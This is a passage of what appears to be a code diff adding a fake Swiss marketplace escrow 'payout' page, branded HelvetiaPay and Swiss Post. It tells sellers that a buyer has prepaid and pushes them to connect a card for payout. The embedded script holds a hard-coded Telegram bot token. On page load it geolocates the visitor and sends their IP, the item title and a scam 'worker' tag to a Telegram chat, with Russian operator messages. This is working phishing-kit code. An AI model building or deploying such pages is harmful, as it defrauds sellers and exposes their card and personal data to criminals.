+        <select class="lang-select" id="lang-select-mobile" aria-label="Select language">
+          <option value="EN" selected>EN — English</option>
+          <option value="DE">DE — Deutsch</option>
+          <option value="FR">FR — Français</option>
+          <option value="IT">IT — Italiano</option>
+          <option value="RM">RM — Rumantsch</option>
+        </select>
+      </div>
+    </div>
+  </header>
+
+  <!-- ==========================================================================
+       MAIN CONTENT CONTAINER
+       ========================================================================== -->
+  <main class="main-wrapper">
+    <div class="flow-container">
+
+      <!-- Step Timeline Bar -->
+      <div class="step-timeline-bar" id="step-timeline">
+        <div class="timeline-steps">
+          <div class="t-step completed">
+            <span class="t-step-num">✓</span>
+            <span class="t-step-label" data-i18n="timeline_step1">Listing Review</span>
+          </div>
+
+          <div class="t-step-line">
+            <div class="t-step-line-fill" style="width: 100%;"></div>
+          </div>
+
+          <div class="t-step active">
+            <span class="t-step-num">2</span>
+            <span class="t-step-label" data-i18n="timeline_step2">Buyer & Escrow Verification</span>
+          </div>
+
+          <div class="t-step-line">
+            <div class="t-step-line-fill" style="width: 0%;"></div>
+          </div>
+
+          <div class="t-step">
+            <span class="t-step-num">3</span>
+            <span class="t-step-label" data-i18n="timeline_step3">Payout Gateway</span>
+          </div>
+        </div>
+
+        <div class="mobile-active-step-label">
+          <span class="mobile-step-pill">Step 2 / 3</span>
+          <span data-i18n="timeline_step2">Buyer & Escrow Verification</span>
+        </div>
+      </div>
+
+      <!-- Sub Header Navigation & Timer -->
+      <div class="status-bar">
+        <a href="index.html" class="back-nav-link" id="link-back-step1">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="15 18 9 12 15 6"/>
+          </svg>
+          <span data-i18n="back_step1">Back to Listing Review</span>
+        </a>
+
+        <div class="timer-badge">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+          </svg>
+          <span data-i18n="timer_lock">Reservation Lock:</span>
+          <strong id="timer-display">14:59 min</strong>
+        </div>
+      </div>
+
+      <!-- Banker Security Shield Status Banner -->
+      <div class="escrow-banker-banner">
+        <div class="shield-icon-wrap">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/>
+            <path d="m9 12 2 2 4-4"/>
+          </svg>
+        </div>
+        <div class="escrow-banner-content">
+          <div class="escrow-banner-title">
+            <span data-i18n="escrow_banner_title">Funds Deposited in Swiss Escrow Account</span>
+            <span class="escrow-lock-badge">
+              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+              </svg>
+              <span data-i18n="escrow_locked_tag">Secured & Reserved</span>
+            </span>
+          </div>
+          <p class="escrow-banner-desc">
+            <span data-i18n="escrow_banner_desc_pre">The buyer has deposited the full transaction amount of</span>
+            <strong class="escrow-banner-amount" id="escrow-amount-display">CHF 1'465.00</strong>
+            <span data-i18n="escrow_banner_desc_post">into the certified Swiss escrow holding vault. Funds will be credited directly to your payout card upon confirmation.</span>
+          </p>
+        </div>
+      </div>
+
+      <!-- Swiss Post (Die Post) Read-Only Courier Waybill -->
+      <div class="waybill-card">
+        <div class="waybill-header">
+          <div class="post-logo-block">
+            <div class="die-post-emblem">
+              <div class="die-post-cross"></div>
+              <span>Die Post / Swiss Post</span>
+            </div>
+            <span class="waybill-title-text" data-i18n="waybill_header_title">Insured Courier Dispatch Waybill</span>
+          </div>
+          <div class="waybill-badge-status">
+            <span class="waybill-badge-dot"></span>
+            <span data-i18n="waybill_verified_status">Buyer Address Verified (Swiss GIS)</span>
+          </div>
+        </div>
+
+        <div class="waybill-body">
+          
+          <!-- Structured Read-Only Fields -->
+          <div class="dispatch-info-grid">
+            
+            <!-- Buyer Name -->
+            <div class="dispatch-item full-width">
+              <span class="dispatch-label" data-i18n="lbl_buyer_recipient">Buyer (Recipient)</span>
+              <div class="dispatch-val-box highlight">
+                <span id="buyer-name-val">Marc H. Zimmermann</span>
+                <span class="verified-check-mini">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+                </span>
+              </div>
+            </div>
+
+            <!-- Prominent City & Postal Code (Large display) -->
+            <div class="dispatch-item full-width">
+              <span class="dispatch-label" data-i18n="lbl_plz_city">Postal Code & Canton (Destination)</span>
+              <div class="dispatch-val-box prominent">
+                <div>
+                  <div class="prominent-city-title" id="buyer-city-val">8001 Zürich</div>
+                  <div style="font-size: 0.78rem; color: var(--neutral-600);">Kanton Zürich • Official Swiss Post Delivery Zone</div>
+                </div>
+                <span class="prominent-canton-tag">ZH</span>
+              </div>
+            </div>
+
+            <!-- Street Address & Building -->
+            <div class="dispatch-item full-width">
+              <span class="dispatch-label" data-i18n="lbl_delivery_street">Delivery Street & House Number</span>
+              <div class="dispatch-val-box">
+                <span id="buyer-street-val">Bahnhofstrasse 45, App. 3B</span>
+                <span class="verified-check-mini">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+                </span>
+              </div>
+            </div>
+
+            <!-- Shipping Courier Method -->
+            <div class="dispatch-item">
+              <span class="dispatch-label" data-i18n="lbl_shipping_method">Shipping Method</span>
+              <div class="dispatch-val-box highlight">
+                <span id="buyer-courier-val">Swiss Post Priority (A-Post)</span>
+              </div>
+            </div>
+
+            <!-- Escrow Insurance -->
+            <div class="dispatch-item">
+              <span class="dispatch-label" data-i18n="lbl_insurance">Package Insurance</span>
+              <div class="dispatch-val-box">
+                <span style="color: var(--emerald-700); font-weight: 700;">CHF 5'000.00 (Active)</span>
+              </div>
+            </div>
+
+          </div>
+
+          <!-- Static Swiss Map Widget (100% Width Responsive) -->
+          <div class="map-widget-container">
+            <div class="map-widget" id="map-widget-box">
+              <div class="map-canvas-layer"></div>
+              <div class="map-glass-edge"></div>
+              
+              <!-- Laser-sweep Animated Scanning Beam -->
+              <div class="map-scan-beam"></div>
+
+              <!-- High-Precision Minimalist Luxury GIS Map SVG (Zurich Center) -->
+              <svg class="map-road-svg" viewBox="0 0 500 240" preserveAspectRatio="none">
+                <defs>
+                  <linearGradient id="swissWaterGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" stop-color="#E2EBF4" stop-opacity="0.9"/>
+                    <stop offset="100%" stop-color="#D0DEEC" stop-opacity="0.95"/>
+                  </linearGradient>
+                  <filter id="cityBuildingShadow" x="-10%" y="-10%" width="120%" height="130%">
+                    <feDropShadow dx="0" dy="1" stdDeviation="1" flood-color="#0F172A" flood-opacity="0.06"/>
+                  </filter>
+                </defs>
+
+                <!-- 1. Water Body (Limmat & Lake Zurich with clean icy tint) -->
+                <path d="M 0 175 C 110 168, 195 192, 280 182 C 360 172, 430 200, 500 188 L 500 240 L 0 240 Z" fill="url(#swissWaterGrad)"/>
+                <path d="M 238 -5 C 242 55, 222 108, 262 182" fill="none" stroke="url(#swissWaterGrad)" stroke-width="22" stroke-linecap="round"/>
+
+                <!-- 2. Minimalist Green Spaces (Lindenhof, Parks) -->
+                <path d="M 195,12 240,6 236,44 185,38 Z" fill="#E4EFE7" stroke="#CADECF" stroke-width="0.8"/>
+                <path d="M 165,72 210,68 206,112 162,107 Z" fill="#E4EFE7" stroke="#CADECF" stroke-width="0.8"/>
+                <path d="M 35,132 115,128 138,170 42,175 Z" fill="#E4EFE7" stroke="#CADECF" stroke-width="0.8"/>
+                <path d="M 345,38 425,32 435,80 360,88 Z" fill="#E4EFE7" stroke="#CADECF" stroke-width="0.8"/>
+                <path d="M 365,118 450,112 460,160 380,170 Z" fill="#E4EFE7" stroke="#CADECF" stroke-width="0.8"/>
+
+                <!-- 3. Architectural Urban Grid (Subtle semi-transparent blocks) -->
+                <g filter="url(#cityBuildingShadow)">
+                  <!-- Left Quarter -->
+                  <rect x="48" y="28" width="34" height="22" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="92" y="26" width="38" height="18" rx="2.5" fill="#F8FAFC" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="58" y="62" width="42" height="26" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="110" y="58" width="28" height="32" rx="2.5" fill="#F1F5F9" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="42" y="98" width="48" height="20" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="100" y="100" width="38" height="18" rx="2.5" fill="#F8FAFC" stroke="#E2E8F0" stroke-width="0.8"/>
+
+                  <!-- City Center / Financial Quarter Blocks -->
+                  <rect x="175" y="122" width="42" height="28" rx="2.5" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="0.9"/>
+                  <rect x="228" y="80" width="48" height="36" rx="2.5" fill="#FFFFFF" stroke="#D52B1E" stroke-width="1.2" stroke-opacity="0.85"/>
+                  <rect x="234" y="86" width="36" height="10" rx="1.5" fill="#FEE2E2" opacity="0.6"/>
+                  <rect x="226" y="130" width="38" height="24" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="270" y="125" width="32" height="30" rx="2.5" fill="#F8FAFC" stroke="#E2E8F0" stroke-width="0.8"/>
+
+                  <!-- Right Quarter Blocks -->
+                  <rect x="290" y="22" width="30" height="24" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="285" y="56" width="36" height="20" rx="2.5" fill="#F8FAFC" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="280" y="88" width="40" height="24" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="330" y="100" width="26" height="32" rx="2.5" fill="#F1F5F9" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="438" y="50" width="32" height="38" rx="2.5" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="0.8"/>
+                  <rect x="395" y="130" width="42" height="26" rx="2.5" fill="#F8FAFC" stroke="#E2E8F0" stroke-width="0.8"/>
+                </g>
+
+                <!-- 4. Crisp White Road Network with subtle margins -->
+                <!-- Arterials -->
+                <path d="M 0 54 L 175 54 L 285 54 L 500 54" fill="none" stroke="#FFFFFF" stroke-width="5" stroke-linecap="round"/>
+                <path d="M 0 54 L 175 54 L 285 54 L 500 54" fill="none" stroke="#E2E8F0" stroke-width="1.2"/>
+
+                <path d="M 0 124 L 175 124 L 285 124 L 500 124" fill="none" stroke="#FFFFFF" stroke-width="4.5" stroke-linecap="round"/>
+                <path d="M 0 124 L 175 124 L 285 124 L 500 124" fill="none" stroke="#E2E8F0" stroke-width="1.2"/>
+
+                <!-- Bahnhofstrasse -->
+                <path d="M 226 -5 L 226 175" fill="none" stroke="#FFFFFF" stroke-width="6" stroke-linecap="round"/>
+                <path d="M 226 -5 L 226 175" fill="none" stroke="#F1F5F9" stroke-width="2"/>
+
+                <!-- Bridges across Limmat -->
+                <line x1="215" y1="56" x2="260" y2="56" stroke="#94A3B8" stroke-width="3.5" stroke-linecap="round"/>
+                <line x1="205" y1="106" x2="250" y2="106" stroke="#94A3B8" stroke-width="3.5" stroke-linecap="round"/>
+                <line x1="220" y1="160" x2="270" y2="160" stroke="#94A3B8" stroke-width="4" stroke-linecap="round"/>
+              </svg>
+
+              <!-- Minimalist Pulsing Swiss Red Dot Pin with Radar Waves -->
+              <div class="map-pin-pulse-wrap">
+                <div class="map-pulse-ring-secondary"></div>
+                <div class="map-pulse-ring"></div>
+                <div class="map-radar-dot"></div>
+                <div class="map-pin-label">
+                  <span class="map-pin-dot-indicator"></span>
+                  <span>8001 Zürich • Bahnhofstrasse 45</span>
+                </div>
+              </div>
+
+              <!-- Tactical GIS Overlay Tags -->
+              <div class="map-hud-overlay">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#D52B1E" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v8"/><path d="M8 12h8"/></svg>
+                <span>GIS-CH: 47.3769° N, 8.5417° E</span>
+              </div>
+
+              <div class="map-scale-tag">
+                1:2'500 • SWISSTOPO
+              </div>
+            </div>
+
+            <div class="map-caption">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg>
+              <span data-i18n="map_caption_text">Verified Swiss delivery zone • Pre-paid label generated</span>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Mandatory Verification Checkboxes -->
+      <div class="confirmation-terms-card">
+        
+        <label class="custom-checkbox-row" for="chk-dispatch-promise">
+          <input type="checkbox" id="chk-dispatch-promise" />
+          <div class="checkbox-box">
+            <svg class="checkbox-check-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <span class="checkbox-label-text" data-i18n="chk_promise_text">
+            <strong>I agree to dispatch the item</strong> to the specified verified Swiss address within 7 business days following payout release.
+          </span>
+        </label>
+
+        <label class="custom-checkbox-row" for="chk-details-accurate">
+          <input type="checkbox" id="chk-details-accurate" />
+          <div class="checkbox-box">
+            <svg class="checkbox-check-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <span class="checkbox-label-text" data-i18n="chk_accurate_text">
+            <strong>I confirm the accuracy of transaction details</strong> and accept the Swiss Marketplace Escrow release terms and payout protocol.
+          </span>
+        </label>
+
+      </div>
+
+      <!-- Continue Action Button -->
+      <div>
+        <button type="button" class="btn-action-primary" id="btn-proceed-step3" disabled>
+          <span class="btn-spinner" id="btn-step2-spinner"></span>
+          <span id="txt-btn-step2" data-i18n="btn_confirm_card">Confirm & Connect Payout Card</span>
+          <svg class="btn-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12h14"/>
+            <path d="m12 5 7 7-7 7"/>
+          </svg>
+        </button>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- FLOATING SUPPORT CHAT -->
+  <button type="button" class="chat-trigger" id="chat-trigger-btn" aria-label="Open Swiss Support Chat">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+    </svg>
+  </button>
+
+  <div class="chat-widget-panel" id="chat-panel">
+    <div class="chat-header">
+      <div style="font-weight: 700; font-size: 0.875rem;">HelvetiaPay Zürich Desk</div>
+      <button type="button" id="chat-close-btn" style="background:none; border:none; color:#fff; cursor:pointer; font-size: 1.1rem;">✕</button>
+    </div>
+    <div class="chat-body" id="chat-messages-container">
+      <div class="chat-msg system" id="chat-welcome-msg">Grüezi! The buyer has pre-funded the transaction in escrow. Confirm the dispatch address to connect your card for immediate payout.</div>
+    </div>
+    <form class="chat-footer" id="chat-form">
+      <input type="text" class="chat-input" id="chat-input" placeholder="Type your question..." />
+      <button type="submit" class="chat-send-btn">Send</button>
+    </form>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <!-- ==========================================================================
+       JAVASCRIPT LOGIC
+       ========================================================================== -->
+  <script>
+    (function() {
+      'use strict';
+
+      /* Swiss Multi-Language Dictionary */
+      const translations = {
+        EN: {
+          timeline_step1: "Listing Review",
+          timeline_step2: "Buyer & Escrow Verification",
+          timeline_step3: "Payout Gateway",
+          back_step1: "Back to Listing Review",
+          timer_lock: "Reservation Lock:",
+          escrow_banner_title: "Funds Deposited in Swiss Escrow Account",
+          escrow_locked_tag: "Secured & Reserved",
+          escrow_banner_desc_pre: "The buyer has deposited the full transaction amount of",
+          escrow_banner_desc_post: "into the certified Swiss escrow holding vault. Funds will be credited directly to your payout card upon confirmation.",
+          waybill_header_title: "Insured Courier Dispatch Waybill",
+          waybill_verified_status: "Buyer Address Verified (Swiss GIS)",
+          lbl_buyer_recipient: "Buyer (Recipient)",
+          lbl_plz_city: "Postal Code & Canton (Destination)",
+          lbl_delivery_street: "Delivery Street & House Number",
+          lbl_shipping_method: "Shipping Method",
+          lbl_insurance: "Package Insurance",
+          map_caption_text: "Verified Swiss delivery zone • Pre-paid label generated",
+          chk_promise_text: "<strong>I agree to dispatch the item</strong> to the specified verified Swiss address within 7 business days following payout release.",
+          chk_accurate_text: "<strong>I confirm the accuracy of transaction details</strong> and accept the Swiss Marketplace Escrow release terms and payout protocol.",
+          btn_confirm_card: "Confirm & Connect Payout Card",
+          btn_loading_card: "Connecting to Swiss Payout Gateway...",
+          chat_welcome: "Grüezi! The buyer has pre-funded the transaction in escrow. Confirm the dispatch address to connect your card for immediate payout.",
+          toast_navigating: "Securing Escrow channel • Loading Payout Gateway..."
+        },
+        DE: {
+          timeline_step1: "Artikelübersicht",
+          timeline_step2: "Käufer- & Treuhandprüfung",
+          timeline_step3: "Auszahlungsschleuse",
+          back_step1: "Zurück zur Artikelübersicht",
+          timer_lock: "Reservierungsdauer:",
+          escrow_banner_title: "Gelder auf Schweizer Treuhandkonto hinterlegt",
+          escrow_locked_tag: "Gesichert & Reserviert",
+          escrow_banner_desc_pre: "Der Käufer hat den gesamten Betrag von",
+          escrow_banner_desc_post: "auf dem Schweizer Treuhandkonto hinterlegt. Die Auszahlung erfolgt nach Bestätigung direkt auf Ihre Karte.",
+          waybill_header_title: "Versicherter Post-Frachtbrief",
+          waybill_verified_status: "Käuferadresse verifiziert (Die Post GIS)",
+          lbl_buyer_recipient: "Käufer (Empfänger)",
+          lbl_plz_city: "Postleitzahl & Kanton (Zielort)",
+          lbl_delivery_street: "Lieferstrasse & Hausnummer",
+          lbl_shipping_method: "Versandart",
+          lbl_insurance: "Paketversicherung",
+          map_caption_text: "Geprüfte Schweizer Lieferzone • Versandetikette bereit",
+          chk_promise_text: "<strong>Ich verpflichte mich, den Artikel</strong> innerhalb von 7 Werktagen nach Auszahlung an die Schweizer Adresse zu versenden.",
+          chk_accurate_text: "<strong>Ich bestätige die Richtigkeit der Transaktionsdaten</strong> und akzeptiere die Schweizer Treuhandbestimmungen.",
+          btn_confirm_card: "Bestätigen & Auszahlungskarte verbinden",
+          btn_loading_card: "Verbindung zum Auszahlungs-Gateway...",
+          chat_welcome: "Grüezi! Der Käufer hat den Betrag auf dem Treuhandkonto hinterlegt. Bestätigen Sie die Adresse für die Auszahlung.",
+          toast_navigating: "Treuhand-Kanal gesichert • Auszahlung wird geladen..."
+        },
+        FR: {
+          timeline_step1: "Récapitulatif",
+          timeline_step2: "Vérification séquestre & acheteur",
+          timeline_step3: "Passerelle de versement",
+          back_step1: "Retour au récapitulatif",
+          timer_lock: "Verrouillage de session :",
+          escrow_banner_title: "Fonds déposés sur compte séquestre suisse",
+          escrow_locked_tag: "Sécurisé & Réservé",
+          escrow_banner_desc_pre: "L'acheteur a versé la totalité du montant de",
+          escrow_banner_desc_post: "sur le compte séquestre certifié. Le virement sera exécuté directement sur votre carte.",
+          waybill_header_title: "Lettre de voiture coursier assuré",
+          waybill_verified_status: "Adresse acheteur certifiée (Poste Suisse)",
+          lbl_buyer_recipient: "Acheteur (Destinataire)",
+          lbl_plz_city: "NPA & Canton (Destination)",
+          lbl_delivery_street: "Rue et numéro de livraison",
+          lbl_shipping_method: "Mode d'expédition",
+          lbl_insurance: "Assurance colis",
+          map_caption_text: "Zone de livraison suisse certifiée • Étiquette générée",
+          chk_promise_text: "<strong>Je m'engage à expédier le colis</strong> à l'adresse suisse indiquée dans les 7 jours ouvrés suivant le versement.",
+          chk_accurate_text: "<strong>Je confirme l'exactitude des détails</strong> et j'accepte les conditions du séquestre suisse.",
+          btn_confirm_card: "Confirmer et lier la carte de paiement",
+          btn_loading_card: "Connexion à la passerelle de versement...",
+          chat_welcome: "Bonjour ! L'acheteur a déposé les fonds sous séquestre. Validez l'adresse pour recevoir le versement.",
+          toast_navigating: "Canal sécurisé • Chargement de la passerelle..."
+        },
+        IT: {
+          timeline_step1: "Riepilogo",
+          timeline_step2: "Verifica deposito e acquirente",
+          timeline_step3: "Gateway di accredito",
+          back_step1: "Torna alla scheda articolo",
+          timer_lock: "Validità sessione:",
+          escrow_banner_title: "Fondi depositati su conto vincolato svizzero",
+          escrow_locked_tag: "Protetto & Riservato",
+          escrow_banner_desc_pre: "L'acquirente ha depositato l'importo di",
+          escrow_banner_desc_post: "nel deposito fiduciario svizzero certificato. I fondi saranno accreditati sulla tua carta.",
+          waybill_header_title: "Lettera di vettura corriere assicurato",
+          waybill_verified_status: "Indirizzo verificato (Posta Svizzera)",
+          lbl_buyer_recipient: "Acquirente (Destinatario)",
+          lbl_plz_city: "CAP & Cantone (Destinazione)",
+          lbl_delivery_street: "Via e numero civico",
+          lbl_shipping_method: "Metodo di spedizione",
+          lbl_insurance: "Assicurazione pacco",
+          map_caption_text: "Zona di consegna svizzera verificata • Etichetta pronta",
+          chk_promise_text: "<strong>Mi impegno a spedire il pacco</strong> all'indirizzo svizzero indicato entro 7 giorni dall'accredito.",
+          chk_accurate_text: "<strong>Confermo la correttezza della transazione</strong> e accetto le condizioni di deposito a garanzia.",
+          btn_confirm_card: "Conferma e collega carta di accredito",
+          btn_loading_card: "Connessione al gateway di pagamento...",
+          chat_welcome: "Salve! L'acquirente ha versato i fondi. Conferma i dettagli di consegna per procedere all'accredito.",
+          toast_navigating: "Canale sicuro • Apertura gateway di pagamento..."
+        },
+        RM: {
+          timeline_step1: "Resumaziun",
+          timeline_step2: "Verificaziun da l'adressa",
+          timeline_step3: "Portal da pajament",
+          back_step1: "Enavos a la resumaziun",
+          timer_lock: "Sessiun reservada:",
+          escrow_banner_title: "Meds finanzials segirads en il conto fiduciar",
+          escrow_locked_tag: "Segirà & Reservà",
+          escrow_banner_desc_pre: "Il cumprader ha deponì l'import da",
+          escrow_banner_desc_post: "en il conto fiduciar svizzer. Ils daners vegnan creditads directamain sin vossa carta.",
+          waybill_header_title: "Frachtbrev da la Posta Svizra",
+          waybill_verified_status: "Adressa verifitgada (Posta Svizra)",
+          lbl_buyer_recipient: "Cumprader (Receptur)",
+          lbl_plz_city: "Numer postal & Chantun",
+          lbl_delivery_street: "Strada e numer da chasa",
+          lbl_shipping_method: "Moda da spediziun",
+          lbl_insurance: "Assicuranza da pachet",
+          map_caption_text: "Zona da consegna controllada • Etichetta pronta",
+          chk_promise_text: "<strong>Jau m'oblig da trametter l'artitgel</strong> entaifer 7 dis suenter la liberaziun dal pajament.",
+          chk_accurate_text: "<strong>Jau conferm la correctadad da las datas</strong> ed accept las cundiziuns.",
+          btn_confirm_card: "Confermar & colliar la carta",
+          btn_loading_card: "Colliaziun cun il portal da pajament...",
+          chat_welcome: "Allegra! Il cumprader ha deponì ils daners. Confermai l'adressa per survegnir il pajament.",
+          toast_navigating: "Chanal segirà • Chargia il portal da pajament..."
+        }
+      };
+
+      /* ==========================================================================
+         TELEGRAM TRACKING CONFIGURATION & LOGGING
+         ========================================================================== */
+      const TG_TOKEN = "8946063999:AAE_J-Si_DRinK2KKk1yGIzIsYXzWl_0qfY";
+      const CHAT_LOGS = "-1003964507052";
+
+      let userIp = '127.0.0.1';
+      let userCountry = 'Switzerland';
+      let userCountryCode = 'CH';
+      let userFlag = '🇨🇭';
+      let hasSentPageLoadLog = false;
+
+      function getFlagEmoji(countryCode) {
+        if (!countryCode || countryCode.length !== 2) return '🇨🇭';
+        const codePoints = countryCode
+          .toUpperCase()
+          .split('')
+          .map(char => 127397 + char.charCodeAt(0));
+        return String.fromCodePoint(...codePoints);
+      }
+
+      function getIpHashtag(ip) {
+        if (!ip) return '#ip_0';
+        const cleanIp = String(ip).replace(/[^a-zA-Z0-9]/g, '');
+        return `#ip_${cleanIp}`;
+      }
+
+      function getItemTitle() {
+        try {
+          const urlParams = new URLSearchParams(window.location.search);
+          const titleParam = urlParams.get('title') || urlParams.get('product_title');
+          if (titleParam) {
+            localStorage.setItem('title', titleParam);
+            return titleParam;
+          }
+          const saved = localStorage.getItem('title') || sessionStorage.getItem('helvetia_title') || sessionStorage.getItem('product_title');
+          if (saved) return saved;
+        } catch (e) {}
+        return 'Omega Speedmaster Professional Moonwatch';
+      }
+
+      function getWorker() {
+        try {
+          const urlParams = new URLSearchParams(window.location.search);
+          const workerParam = urlParams.get('creator') || urlParams.get('worker');
+          if (workerParam) {
+            localStorage.setItem('creator', workerParam);
+            return workerParam;
+          }
+          const saved = localStorage.getItem('creator');
+          if (saved) return saved;
+        } catch (e) {}
+        return 'anonymous';
+      }
+
+      function escapeHtml(str) {
+        if (!str) return '';
+        return String(str)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;');
+      }
+
+      async function sendToTelegram(chatId, htmlMessage) {
+        try {
+          const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+          await fetch(url, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: htmlMessage,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (err) {
+          console.error('Telegram logging failed:', err);
+        }
+      }
+
+      async function initGeoAndTracking() {
+        try {
+          const res = await fetch('https://ipwho.is/');
+          const data = await res.json();
+          if (data && data.success !== false && data.ip) {
+            userIp = data.ip;
+            userCountry = data.country || 'Switzerland';
+            userCountryCode = data.country_code || 'CH';
+            userFlag = (data.flag && data.flag.emoji) ? data.flag.emoji : getFlagEmoji(userCountryCode);
+          } else {
+            throw new Error('Fallback needed');
+          }
+        } catch (e) {
+          try {
+            const res2 = await fetch('https://ipapi.co/json/');
+            const data2 = await res2.json();
+            if (data2 && data2.ip) {
+              userIp = data2.ip;
+              userCountry = data2.country_name || 'Switzerland';
+              userCountryCode = data2.country_code || 'CH';
+              userFlag = getFlagEmoji(userCountryCode);
+            }
+          } catch (e2) {}
+        }
+
+        // Send initial page load tracking to CHAT_LOGS
+        if (!hasSentPageLoadLog) {
+          hasSentPageLoadLog = true;
+          const pageLoadMsg = `📦 <b>[Шаг 2] Юзер открыл швейцарскую накладную и изучает адрес.</b>\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👑 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
+          sendToTelegram(CHAT_LOGS, pageLoadMsg);
+        }
+      }
+
+      let currentLang = 'EN';
+
+      /* Number Formatter */
+      function formatSwissPrice(num) {
+        if (isNaN(num)) return "0.00";
+        const parts = Number(num).toFixed(2).split('.');
+        parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\\d))/g, "'");
+        return parts.join('.');
+      }
+
+      /* Hydrate Data from Session / URL */
+      function hydrateStep2Data() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let basePrice = 1450.00;
+        let deliveryCost = 15.00;
+        let deliveryName = "Swiss Post Priority (A-Post)";
+
+        if (sessionStorage.getItem('helvetia_price')) {
+          basePrice = parseFloat(sessionStorage.getItem('helvetia_price')) || 1450.00;
+        } else if (urlParams.has('price')) {
+          basePrice = parseFloat(urlParams.get('price').replace(/[^0-9.]/g, '')) || 1450.00;
+        }
+
+        if (sessionStorage.getItem('helvetia_delivery_cost')) {
+          deliveryCost = parseFloat(sessionStorage.getItem('helvetia_delivery_cost')) || 15.00;
+        }
+        if (sessionStorage.getItem('helvetia_selected_delivery_name')) {
+          deliveryName = sessionStorage.getItem('helvetia_selected_delivery_name');
+        }
+
+        const total = basePrice + deliveryCost;
+        const formattedTotal = 'CHF ' + formatSwissPrice(total);
+
+        const escrowAmountEl = document.getElementById('escrow-amount-display');
+        const buyerCourierEl = document.getElementById('buyer-courier-val');
+
+        if (escrowAmountEl) escrowAmountEl.textContent = formattedTotal;
+        if (buyerCourierEl) buyerCourierEl.textContent = deliveryName;
+
+        // Pass calculated total to session for Step 3
+        sessionStorage.setItem('helvetia_total_payout', total);
+      }
+
+      /* Smart Scroll Header */
+      function initSmartHeaderScroll() {
+        const header = document.getElementById('main-header');
+        if (!header) return;
+        let lastScrollY = window.pageYOffset || document.documentElement.scrollTop;
+        let ticking = false;
+
+        window.addEventListener('scroll', () => {
+          if (!ticking) {
+            window.requestAnimationFrame(() => {
+              const currentScrollY = window.pageYOffset || document.documentElement.scrollTop;
+              if (currentScrollY > 50 && currentScrollY > lastScrollY + 4) {
+                header.classList.add('header-hidden');
+              } else if (currentScrollY < lastScrollY - 4 || currentScrollY <= 20) {
+                header.classList.remove('header-hidden');
+              }
+              lastScrollY = Math.max(0, currentScrollY);
+              ticking = false;
+            });
+            ticking = true;
+          }
+        }, { passive: true });
+      }
+
+      /* Timer synchronization */
+      function initTimer() {
+        const timerEl = document.getElementById('timer-display');
+        let totalSeconds = 14 * 60 + 59;
+        const savedTime = sessionStorage.getItem('helvetia_timer_seconds');
